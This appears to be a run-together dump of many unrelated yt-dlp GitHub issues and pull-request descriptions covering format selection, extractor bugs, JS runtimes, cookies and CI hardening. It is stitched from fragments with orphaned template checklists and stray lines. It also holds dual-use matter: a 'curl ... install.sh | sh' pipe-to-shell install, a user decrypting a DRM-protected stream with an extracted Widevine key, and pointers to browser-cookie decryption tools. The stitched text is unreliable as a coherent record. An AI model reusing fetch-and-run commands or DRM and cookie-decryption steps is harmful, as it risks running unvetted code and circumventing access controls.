- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

"Download video with FILESIZE constraint ### Checklist

- [x] I'm requesting a feature unrelated to a specific site
- [x] I've looked through the [README](https://github.com/yt-dlp/yt-dlp#readme)
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar requests **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Provide a description that is worded well enough to be understood

I can download video of selected format by `-f`, I can also download video with best video by syntax `bv`, best audio by `ba`, file extension mp4 by `ext=mp4`.

I want to download video which is best video but size is below 200M, currently yt-dlp can not support this feature.

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

"[fd/ffmpeg] Use info dict `http_headers` for direct merge downloads Addresses https://github.com/yt-dlp/yt-dlp/pull/13210#discussion_r2655976236

Currently, if an extractor returns `http_headers` in the info dict root (and *not* in the individual format dicts), and if ffmpeg is used to download+direct-merge separate video and formats, then the info dict root's `http_headers` are ignored instead of being passed with the ffmpeg arguments.

This patch fixes that subtle bug in `FFmpegFD`'s handling of `http_headers`.

"Always use file name with stream selection option ### Checklist

- [x] I'm requesting a feature unrelated to a specific site
- [x] I've looked through the [README](https://github.com/yt-dlp/yt-dlp#readme)
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar requests **including closed ones**. DO NOT post duplicates

### Provide a description that is worded well enough to be understood

When downloading multiple streams, yt-dlp will use filenames with the stream selection embedded in the filename, however when downloading a single stream it won't. I would very much like the option to always have the stream selection embedded so I don't have file names conflict when either downloading them individually or when multiple streams download error and I need to merge with a different selection

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

Audio/Video downloads can contain visible metadata file attributes; these are visible with tools such as `sips, mdls, exiftool, xattr`.

Audio/Video downloads also could potentially contain encoded user identification embedded in the video/audio stream/tracks.

The user performing archival of audio/video content may be unaware of this traceable data (which would change per platform). If there any cases like this, it should be noted in the MD files of the repo or Wiki?

### Region

Netherlands

### Provide a description that is worded well enough to be understood

The Twitch extractor is able to list and fetch clips, e.g.:
```
$ yt-dlp --flat-playlist --print ""%(webpage_url)s"" ""https://www.twitch.tv/esl_sc2/clips""

https://www.twitch.tv/esl_sc2/clip/EnchantingShyTomatoANELE-_UOgfiWrGNcpGNE7
(... etc.)
```
This yields a number of valid clip URLs for the given account.

When fetching a nonexistent account (or an account that used to exist but has since been closed down), it instead returns a large number of clips from various totally different accounts. For example:
```
$ yt-dlp --flat-playlist --print ""%(webpage_url)s"" ""https://www.twitch.tv/a-non-existent-account716823687123xcvxcv/clips""
```
After a little while (it's fetching many many pages of GQL results) it returns numerous clip URLs for various random accounts.

This only occurs for `/clips` or for `/videos?filter=clips` (the urls are equivalent). It does not occur for e.g. `/videos` or `/videos?filter=all` or any of the other filter values.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

Russia

### Provide a description that is worded well enough to be understood

When trying to download a track, the error ""502 Bad Gateway"" appears. I tried using yt-dlp with and without a proxy, but the results were not successful. The problem is that I don't have any additional folders in the program folder except _internal, yt-dlp-plugins, and the executable file. yt-dlp.exe . I have folders in the yt-dlp-plugins folder 123/yt_dlp_plugins/postprocessor/chrome_cookie_unlock.py
I tried searching for something related to yt-dlp in the Appdata/Roaming, AppData/Local, and AppData/LocalLow folders, but I didn't find anything there either.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

Hello
I am using **google cloab** for downloading youtube videos. Today youtube doesn't allow downloading, but one month ago it allows.

I have installed **deno** and used that for external js extractor, but it seems the error occurred from another points.

my environment preparation and installation:
```bash
## install deno
curl -fsSL https://deno.land/install.sh | sh
## install ffmpeg
sudo apt-get install ffmpeg -y -qq >/dev/null
## install yt-dlp (with ejs)
pip install -U ""yt-dlp[default]""
```

The error returned from yt-dlp is **ERROR 403**.  The executed command is:

```
yt-dlp -vU -f 18 'https://www.youtube.com/watch?v=sDJymyfAOKY' -o yourfilename
```

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Description of your *pull request* and other information

In some case code compressed using the p.a.c.k.e.r algorithm might leave some symbols inplace instead of putting them in the symbols map. This means that not every word in the compressed code might be a key to the symbol map, causing KeyError. Simple fix by returning the key if the matching symbol is not found.

I am attempting to archive a Youtube channel with significant history, and every now and then I'm getting videos of AV01, Webm, or H265. Most videos appear to be h264/m4a, especially the older ones.

It seems like some videos happen to have a newer format and H264 available, so I would like to request the H264 format (and aac audio, more on that further down) for compatibility/probably being more ""original"", but _only_ if it's not lower resolution/quality/bitrate than the other format.

I'm having some trouble understanding some of the sorting parameters:

So, if the default parameter order is,
```
lang,quality,res,fps,hdr:12,vcodec,channels,acodec,size,br,asr,proto,ext,hasaud,source,id
```
...and I'd like `+vcodec:avc`, do I need to embed that into the middle of that string so I don't override the other parameters' order? I want to be sure I get the best video resolution/bitrate, but choose the H264 all else equal.

```
#I am guessing I _may_ need e.g. 
lang,quality,res,fps,hdr:12,+vcodec:avc,channels,acodec,size,br,asr,proto,ext,hasaud,source,id
```

Is there anything else I should watch for or compare in this for my use case? **Ideally** I'd like the format it was uploaded in/the original video, but I don't think that's available.
Is yt-dlp smart enough to pick e.g. a different format at a lower bitrate that is actually better looking than my preferred format at higher bitrate? I see there's a `quality` field in there, but I don't know what it's measuring or how.

If there's actually an objective measure for this, I can continue re-encoding the other codecs at x264 18 quality, I suppose...
If there's not, perhaps it may be best to also download whatever the ""default"" video format is _if different_ so I can compare them in case the H264 is actually worse or is a re-encoding of a re-encoding/not the original?

I think I could download both and save them by codec with the following (I admittedly haven't bugtested this for what are going to be obvious reasons), but from what I know it will _always_ download both videos (even if the H264 is worse than the other formats) _and_ will have a collision if the best video is H264. Is there a _good_ way to do that?
```
yt-dlp -f ""(bv*[vcodec~='^((he|a)vc|h26[45])','format_id!*=-sr]'+ba),(bv*['format_id!*=-sr']+ba/b['format_id!*=-sr]')"" -o ""%(title)s.f%(vcodec)s.%(ext)s""
```
(...Among other things, I'm not sure I've escaped the exclude-SR properly for Linux given the commands already use both other types of quotes. There are some videos I'd like that for, but not this collection.)


I also have a question about audio quality and re-encoding, if there are any audiophiles out there. I know Youtube's audio quality is pretty bad, but I don't want to make it worse.
I suspect the original audio format is also m4a (at least, it's the only one about 40% of the time), but most deliver opus or vp9 in a webm container. I've been postprocessing non-m4a/aac audio streams into aac at 192k, which is (allegedly) equivalent to a 320k MP3, but takes more space than Youtube's default 128k aac. This is in hopes of reducing damage to the audio from coding it back.

Am I better off downloading the best codec I can get and encoding at high quality on my end, or trying to request Youtube's aac format if they have it and hoping it's the original/hasn't been re-encoded to that on _their_ end?

If I _do_ request my format directly, is there a way to prefer m4a/aac if available but immediately loop back around to the FLAC formats and descend from there? +acodec:m4a ascends back **up** the list, when I'd _rather_ get the best codec if m4a isn't available. Do I do a format filter on audio e.g. `+ba[acodec=aac]/ba` and leave the acodec field in `-S` alone?

I don't have command output since this is theory and trying to understand the correct approach.

"[ie/nebula] Fix for seasons numbers with decimals 

<!--
    **IMPORTANT**: PRs without the template will be CLOSED
    
    Due to the high volume of pull requests, it may be a while before your PR is reviewed.
    Please try to keep your pull request focused on a single bugfix or new feature.
    Pull requests with a vast scope and/or very large diff will take much longer to review.
    It is recommended for new contributors to stick to smaller pull requests, so you can receive much more immediate feedback as you familiarize yourself with the codebase.

    PLEASE AVOID FORCE-PUSHING after opening a PR, as it makes reviewing more difficult.
-->

### Description of your *pull request* and other information

Nyallo! 

JetLag on Nebula does have a season 13.5 available at https://nebula.tv/jetlag/season/13-5. With the current code, the `-5` of the URL is not picked up, and yt-dlp is downloading the season 13 (Schengen Showdown) instead. This commit fixes this by capturing the `-` character in the season number regex.

### Region

global

### Provide a description that is worded well enough to be understood

issue persists across different countries with the same video at the same `Downloading comment API JSON reply thread` location.

videos with higher comments count are more likely to encounter this issue, but a video with as little as 315 comments is also affected.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

"Deprioritize YouTube ""Super Resolution"" formats (and other AI-upscaled/AI-modified formats) ### Checklist

- [x] I'm requesting a feature unrelated to a specific site
- [x] I've looked through the [README](https://github.com/yt-dlp/yt-dlp#readme)
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar requests **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Provide a description that is worded well enough to be understood

From my understanding, YouTube videos are always downloaded using their original names and audio (e.g. an Arabic video would not be auto-translated at all; not even the video name).

In https://github.com/yt-dlp/yt-dlp/issues/14923#issuecomment-3539437820, it is said by @bashonly that de-prioritization may happen in the near future for super resolution formats, which I agree with, since I don't want AI-upscaled slop.

However, I think a better approach would be to not have the format available in the priority queue *at all*. A new cmd-line option could be added such as `--allow-video-upscaling` and `--no-video-upscaling` (the default).

I think it's not possible to have only a upscaled format available, since that would defy logic, so this option shouldn't cause problems.

Maybe a warning could be added when downloading such as:
`[yt-dlp] Skipping super resolution formats; see the README on GitHub for details`

Thanks.

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

Russia

### Provide a description that is worded well enough to be understood

I tried downloading an 18+ video from YouTube. I exported the cookies step by step using the Get cookies.txt LOCALLY extension. In Hitomi Downloader's settings, I clicked ""Download cookies"" and it says the cookies have been downloaded, but when I try to download the video, it still says I need to export the cookies. Also, my Google account is 18 years old. I'm hoping for help, but I'm not very knowledgeable about these things.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

"[yandexmusic] Fix connection timeouts by using HTTPS for all requests ### Brief summary of changes
Forced HTTPS for API requests, track downloads, and thumbnails to fix connection timeouts on port 80.

### Description
As discussed in #15087, Yandex Music API (api.music.yandex.net) now frequently times out or drops connections when accessed via HTTP (port 80). 

This PR:
- Replaces `http` with `https` in `f_url` and thumbnails.
- Uses `_proto_relative_url` with `https:` for `src_url` to ensure secure metadata fetching.
- Cleans up the implementation using modern f-strings and idiomatic `yt-dlp` helpers.

This supersedes #15317 as it provides a cleaner implementation and passes all linting checks (ruff).

Fixes #15087

I have no idea how to start any debugging leading me to solving it. Any hints? 





### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Description of your *pull request* and other information

The actual episode datetime is split into two fields – episodeDate and episodeTime – with the following quirks:

1. It's _local_ (UTC offset is present but is always set to +00:00 and should be ignored).
2. episodeDate is set to midnight of the episode date, unless DST was in effect at that moment, in which case one hour is subtracted, that is, episodeDate is set to 23:00 of the day _before_ the actual episode date.
3. the date part of episodeTime is garbage and should be ignored.

The one-hour-subtracted-in-case-of-DST quirk is actually a silver lining: as we don't have TZ database on Windows (stdlib's zoneinfo won't work unless tzdata is installed), we have to bring our own TZ offsets info, and, since episodeDate is already adjusted for DST, we only need regular (""winter"") offsets, which, in case of both Europe/London (Rinse UK, Kool FM, SWU FM) and Europe/Paris (Rinse France) are established a long time ago (in the 19th and 20th century, respectively) and stay stable in the 21st century, therefore, it's relatively safe to simply hard code them into the extractor.

### Region

Germany

### Provide a description that is worded well enough to be understood

I am reporting a issue for YouTube where replies to comments don't get downloaded when using --get-comments / --write-comments. I have looked at past issue reports and confirmed that the same parameters used to extract comment replies correctly.

The output below shows the correct number of video comments (1138), which includes comments and replies, the same number that shows when viewing the video in a browser. However, only 786 comments get downloaded. In the comments.json output file, all replies are missing.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

Canada

### Provide a description that is worded well enough to be understood

Most TikTok videos give a ""Unable to extract webpage video data"" error. It's been happening for maybe 2 months now. I'm able to use the TikTok website just fine, whether logged in on the browser or not. I've tried providing browser cookies with a logged-in account to see if that makes a difference, but it doesn't.

This is just one example, but happens on most videos: https://www.tiktok.com/@erinemoriarty/video/7580919616520588557

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

### Provide a description that is worded well enough to be understood

Downloading from YT with yt-dlp doesn't work anymore for me. But in the browser I can watch the same videos without any issues.
According to the logs the installed runtimes, QuickJS and NodeJS are not recognized by yt-dlp. As a result, the site recognizes the client as a bot. This is very funny, since it used to work few days ago and used the JS-runtime (node) for doing the site challenge.

I have tested with `--js-runtimes quickjs:/usr/bin/qjs` and `--js-runtimes node:/usr/bin/nodejs` which does not change anything. I have updated to master which did not help either.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Description of your *pull request* and other information

This PR fixes the CeskaTelevize extractor failing with HTTP 410 when requesting
the deprecated `/v-api/iframe-hash/` endpoint (see #14298).

A minimal fallback for VOD content is added using the stream-data API observed
in the current web player. DASH and HLS formats are extracted from the returned
JSON. The existing iframe-based logic is kept as a fallback for other cases
(eg. live streams).

The change is intentionally minimal and scoped to restoring functionality.
Further refactoring or full playlist parity can be done separately.

Fixes #14298

### Description of your *pull request* and other information

I Changed the default URL matching to match more counter fit, rip offs, questionable sites, etc to allow the extractor to work on a vast variety of website.

To make it actually work on vast variety of website, the extraction logic is kept simple and less error prone. it didn't extract much ( wonder why 🌚 ).

## Major issue
The major issue or error that can be seen is the ClientReadError, which is when the peer closes the connection prematurely.
I can't do anything to prevent this :), besides of course increasing the retires.

## Fixes
Removed the `re` import
Nice tests ( lol have only 2 though )

### Please make sure the question is worded well enough to be understood

Say i wanna update the `logic, url` matching, regex for an extractor, how would i do it?
I read through **CONTRIBUTING.md** and find out how to ***create*** a extractor for a specific website. but it seems like it doesn't tell how to make update to an existing extractor. :)

Do i just follow the same steps? and mark commit message as:
`[Extractor] Modified extractor`

### Provide a description that is worded well enough to be understood


When using `-P temp:` with playlists, yt-dlp processes each entry synchronously:

download → post-process → move to output → next download

The final move step blocks the start of the next download. On slow or remote filesystems this significantly reduces throughput, as disk I/O cannot overlap with network I/O.

Feature request

Add an option to allow asynchronous post-processing, at least for the final move from temp: to the output directory, so the next playlist item can start downloading immediately.

Progress reporting

and moves, it is important to:

Show progress / status of background post-processing tasks

Clearly distinguish download progress from post-processing progress

Surface errors from asynchronous tasks in a visible way

Notes

Current workarounds (`--exec mv &`, external watchers) are fragile and provide no integrated progress or error reporting.

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead

### Description of your *pull request* and other information

Added `sleep` function that counts down.
By borrowing the output mechanism of `FileDownloader` (`_multiline`), the display of the countdown is based on that of Progress.
But didn't implement the update of console title.

So:
- if `quiet` or `noprogress` is True, this PR makes no change.
- by default, the countdown is shown as Progress.
- if `progress_with_newline` is True, the countdown is also with newline.
- console title won't be changed.

### Provide a description that is worded well enough to be understood

At the prompting of yt-dlp, I installed `deno` on my Mac. However, I ended up installing an old version, deno 1.36.4, which is not supported. For this reason, yt-dlp complains that no JS runtime could be found. I didn't realize it was rejecting the version of deno I had until I used `--verbose` to read all output, and I don't think that step would occur to less technical users.

I am upgrading deno now, but there should be an error message that specifically tells the user, ""I found [deno/node/etc], but it was old, I can't use it, update it please.""

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

anywhere

### Provide a description that is worded well enough to be understood

This one is a bit weird with a potential bug under the hood. Technically it will download successfully, but behaviour is weird and not as expected. 

Here's a sample link: 
https://x.com/TopHeroes_/status/2001950365332455490

It might be some ""specific"" link type, like the one that is promo-installs driving one for some game. It's just one video and seems to be a regular post (not embedded or quoted). 
IF  I use ./yt-dlp -vU --no-playlist ""https://x.com/TopHeroes_/status/2001950365332455490"" it eventually downloads just fine. But when I check for formats ytdlp treats it as playlist. 

Regular links like this, for example, work just fine and no error msgs or ""playlist confusion"": https://x.com/drclownphd/status/2003941502826041405?s=46&t=f5twVoviZ0pVn63NaRVE3w

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

Someone has mentioned it in [#10927](https://github.com/yt-dlp/yt-dlp/issues/10927) and it's not a new feature so this count as a question i think

Some implement like [this one for chrome](https://github.com/runassu/chrome_v20_decryption) can do this, so it seems that it is not irreparable

### Provide a description that is worded well enough to be understood

yt-dlp can download duplicates for various reasons which can cause wasted diskspace.

By allowing a parameter to be used which specifies a path to an executable which returns 0 or 1 if the file exists can help mitigate this.

For example, I use search everything and I can use it to check if files exist anywhere in my system. I can write as mall utility to parse the filename of a url that wants to be downloaded by yt-dlp and easily return 0 or 1 if the file exists or not. This is very fast since search everything uses a cached database.

https://www.voidtools.com/support/everything/command_line_interface/
This should be something relatively easy to add. Simply execute a command passed through a parameter, e.g., like --checkexist""C:\es.exe %title%""

where the title is inserted. In this case it wouldn't work directly since es.exe doesn't return 0 and 1 for found and not found but one can create a simple wrapper to parse the results which does. One can further use any method they want. I know one can do this automatically by manually looping over yt-dlp but having this automate would be much better IMO. I use yt-dlp a lot and having to write loops to parse text files containing lists of links isn't the best way.

### Please make sure the question is worded well enough to be understood

with command line yt-dlp, my output files always include ending of youtube url inside brackets in the filename.
example - randome-video-[fhMZqD6B804].m4a
but using yt-dlg (gui version) the output files do not include the youtube url in brackets in the filename.

wondering the best command to add when using normal command line version so output files do not have url, and whats best command i can add using yt-dlg (gui) version so output file names do add the url inside the brackets?
please and thanks in advance for any help/assistance with this.
(sorry if this is wrong place to post this question, wanted to post in discussions but don't see any tab for that)

In the past few days, attempts to download some youtube videos are suddenly failing with this error:
```
ERROR: [youtube] sec162JMp7s: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See  https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp  for how to manually pass cookies. Also see  https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies  for tips on effectively exporting YouTube cookies
```

I'm able to watch the video in my browser (firefox) without any issues.  I'm logged into the youtube website, and have exported my browser's cookies (as `/home/netllama/stuff/cookies.txt`), but that does not help.

### Please make sure the question is worded well enough to be understood

How can I extract the user agent since `--dump-user-agent` is deprecated ?
I quote : 
>  if the UA that yt-dlp used is needed for an external script/downloader, the correct way to handle this is to take all of the headers from the info dict's http_headers field instead.

How do I extract ""the info dict's http_headers field"" in bash to pass it to ""an external script/downloader"" ?

### Provide a description that is worded well enough to be understood

Hello yt-dlp team,
Thank you for your great work. I love yt-dlp on mpv+yt android 

I'm not a technical person, but I have a request for Android users , 

Recent changes in youtube needs external js runtime and enabling cloudflare protection making Hard for Android streaming lover's..

There's a turmux way but it's a little complicated for non technical users and it needs good hardware.

My dream feature: 
A way to easily take a video from the Firefox browser on Android and play it directly in VLC or mpv with just one or two taps. Like a ""Share to MPV/VLC"" button that uses yt-dlp's magic to make it work.

This would be a life-changer for watching videos on phones. So many Android users would love this.

There are some extension in firefox android but not like ytdl they support very few sites.

Ytdl is reliable and secure with thousands of sites support.
Is this possible to make? 

Thank you for reading.

"[build] Harden CI/CD pipeline 
> [!IMPORTANT]
> **This pull request's changes to secret handling in the release workflows may be a breaking change for forks that are using any secrets other than `GPG_SIGNING_KEY` or `ARCHIVE_REPO_TOKEN`**.
> 
> Previously, the release workflow would try to resolve a token secret name based on the `target` or `source` input, e.g. `NIGHTLY_ARCHIVE_REPO_TOKEN` or `CUSTOM_ARCHIVE_REPO_TOKEN`, and then fall back to using the `ARCHIVE_REPO_TOKEN` secret if the resolved token secret name was not found in the repository.
> 
> This behavior has been replaced by the release workflow ***always*** using the `ARCHIVE_REPO_TOKEN` secret as the token for publishing releases to ***any*** external archive repository.

---

This pull request adds a [zizmor](https://github.com/zizmorcore/zizmor) audit of GHA workflows via [zizmor-action](https://github.com/zizmorcore/zizmor-action).

Many of the changes in this PR are to comply with [zizmor's audit rules](https://docs.zizmor.sh/audits/), including:

- [**Pin all actions to commit hashes instead of symbolic references**](https://docs.zizmor.sh/audits/#unpinned-uses)

- [**Explicitly set `GITHUB_TOKEN` permissions at the job level**](https://docs.zizmor.sh/audits/#excessive-permissions)
    - > ...workflows should almost always set `permissions: {}` at the workflow level to disable all permissions by default, and then set specific job-level permissions as needed.

- [**Add explanatory comments to `permissions:` blocks for any permission besides `contents: read`**](https://docs.zizmor.sh/audits/#undocumented-permissions)

- [**Use `actions/checkout` with `persist-credentials: false` whenever possible**](https://docs.zizmor.sh/audits/#artipacked)
    - > Unless needed for git operations, [actions/checkout](https://github.com/actions/checkout) should be used with `persist-credentials: false`. If the persisted credential is needed, it should be made explicit with `persist-credentials: true`.

- [**Remove/replace template expansions in workflow scripts**](https://docs.zizmor.sh/audits/#template-injection)
    - > ...`zizmor` considers all template expansions in code contexts to be code smells, and attempting to selectively permit them is more error-prone than forbidding them in a blanket fashion.

- [**Remove all usage of `actions/cache` from our release pipeline** (even though our particular usage wasn't susceptible to any *known* vulnerabilities)](https://docs.zizmor.sh/audits/#cache-poisoning)
    - **NOTE:** Doing this resulted in complete removal of the `cache-warmer.yml` workflow, and a doubling of the build time for the `linux_armv7l` executable
    - > In general, you should avoid using previously cached CI state within workflows intended to publish build artifacts
    - https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/
    - https://adnanthekhan.com/2024/12/21/cacheract-the-monster-in-your-build-cache/

- [**Set a `name` for all job definitions**](https://docs.zizmor.sh/audits/#anonymous-definition)

- [**Set concurrency limits for any workflows/jobs that are triggered by the `pull_request` event**](https://docs.zizmor.sh/audits/#concurrency-limits)

- [**Avoid loading the entire `secrets` context**](https://docs.zizmor.sh/audits/#overprovisioned-secrets)
    - >  if the user [...] accesses the entire `secrets` context, then the entire `secrets` context is exposed to the runner, even if only a single secret is actually needed. [...] Secrets should be accessed individually by name.

- [**Replace usage of `secrets: inherit` with explicit `secrets:` blocks**](https://docs.zizmor.sh/audits/#secrets-inherit)
    - > [`secrets: inherit`] should almost never be used, as it makes it violates the [Principle of Least Authority](https://en.wikipedia.org/wiki/Principle_of_least_privilege) and makes it impossible to determine which exact secrets a reusable workflow was executed with.

---

In addition, there are some changes **unrelated** to the zizmor audit rules:

- Pin all external docker images to hash that are used by the build workflow

- Explicitly set `shell: bash` for several steps, either to avoid `pwsh` on Windows runners ***or*** to ensure that `pipefail` is set (since it is *not* set without an explicit `shell: bash`)

- Set `$ErrorActionPreference` to `""Stop""` and `$PSNativeCommandUseErrorActionPreference` to `$true` in all `pwsh` code contexts to ensure the steps will fail on non-zero exit codes

- Remove the unused `download.yml` workflow

### Region

UK

### Provide a description that is worded well enough to be understood

I tried to download The Christmas Chart for this year for a laugh. The News video version worked but it lost 3 hours only being 7 minutes but that was the recorded version itself and they binned the rest so that put that idea out of the window.

I then switched to Sounds Iplayer where the audio version lost none of the recording at all. The software gave me an up yours to that version of the link despite using the same protocol for detection as IPlayer due to it being a part of the same site so I guess the software is not set up to read links from that side of the site yet.

This is how the Sounds IPlayer links look like:

https://www.bbc.co.uk/sounds/play/m002n7dy

The one that works look like this:

https://www.bbc.co.uk/iplayer/episode/l0057s5z/the-christmas-number-one-countdown

So to get it working as it's the same IPlayer protocol the first part of the link is the same but instead of /iplayer/ and /episode/ it looks like the audio part is /sounds/ and /play/ to get thesite 100% complete working.

Also it looks like sounds IPlayer just goes into the fuzzy wuzzies but the video version already working has the description after fuzzy wuzzies.

It looks like it should have been easier to get the audio half working than the video thats already working it's just that the url reader is only excepting the iplayer and episode but not the sounds and play version of the folder.

Sport also has a different folder veriant /sport/the sport/live/ and news goes under /news/videos/

It seems like there is quite a lot of folder mixtures to get to the 100% completed the site support phase but hopefully talking about these alternative IPlayer site folders is a good start triggering off more supported folders for the next version.


### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead

### Please make sure the question is worded well enough to be understood

When downloading a DRM-protected stream using ```--allow-u```, the file downloads without issue, but after decrypting (key extracted using widevine decryptor) only the first 10 seconds plays, then the stream is empty. ffmpeg attempts to utilize the stream result in ```aac bitstream error```

Command used:
```yt-dlp --allow-u ""https://youtu.be/peTmOjXlw_o"" --cookies ..\Downloads\cookies-youtube-com.txt -f 149 -o ""%(format)s.%(ext)s"" --downloader-args ""ffmpeg_i:-reconnect 1 -reconnect_streamed 1"" -vU```

Notes:
- This is an authorized stream per the cookies presented and that the video stream succeeded and was fully decryptable, so I don't believe it to be a DRM error
- Attempted this with all available m4a audio streams for the same content and the result was the same
- Format 149 plays in the native web player fully, so I think this stream is valid and the license is valid

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)

### Please make sure the question is worded well enough to be understood

I do batch downloads from youtube, must result in mp4 format. I have several format conditions, which shall all be met. 

Please advise how to specify a suitable params set to fullfil all conditions:

a. if audio track with 'default' language is available, choose it (format_note *= default]' )
     and
b. height must be 1080 or less, but as close to 1080 as possible (SIZE:=' -S height:1080 ')

As a workaround, for now I do 3 consecutive runs with differing params, which is inefficient as hell:

1. -S height:1080 -f format_note *= default]'
2. -S height:1080 -f 96 // this catches mp4   1920x1080
3. -S height:1080 -f 94 // this catches mp4    854x480

Please advise how to combine 

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead

### Please make sure the question is worded well enough to be understood

Hi my question about Android streaming.

As more and more sites are enabling cloudflare protection then you need an account if you don't use a browser.

There are solutions for PC deno etc but what about Android streaming.

For some popular sites we can create accounts but if mostly sites needs account it's pain.

I love to use the Android mpv+yt project but this cloudflare protection breaking site.
Viemo etc 

Is this the end of Android yt streaming projects?

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead

the first link is taken from this thread: https://forum.videohelp.com/threads/405954-Boomstream-video-download

I think the idea is to extract the key from /api/process query, then pass the result to `hls.py` but I was unable to do it without understanding the codebase

the naive method of passing the URL to `playlist.m3u8` doesn't work, the verbose output is below

### Provide verbose output that clearly demonstrates the problem

